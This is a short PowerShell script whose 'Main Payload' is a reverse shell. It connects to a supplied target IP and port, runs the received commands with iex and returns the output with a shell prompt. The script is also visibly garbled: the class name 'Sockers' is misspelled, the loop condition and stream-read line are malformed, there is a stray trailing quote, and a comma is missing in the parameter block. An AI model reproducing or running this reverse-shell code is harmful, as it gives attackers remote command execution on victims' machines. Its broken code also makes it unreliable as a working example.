


function main {
    [CmdletBinding()]
    
    param (
        [string]$TARGET_IP
	[string]$TARGET_PORT
    )
    
    begin{
	# Nothin to show yet
	echo "lol"

    }
    
    Clear-Host

    # Main Payload
    $client = New-Object System.Net.Sockers.TCPClient($TARGET_IP,$TARGET_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

}


main $args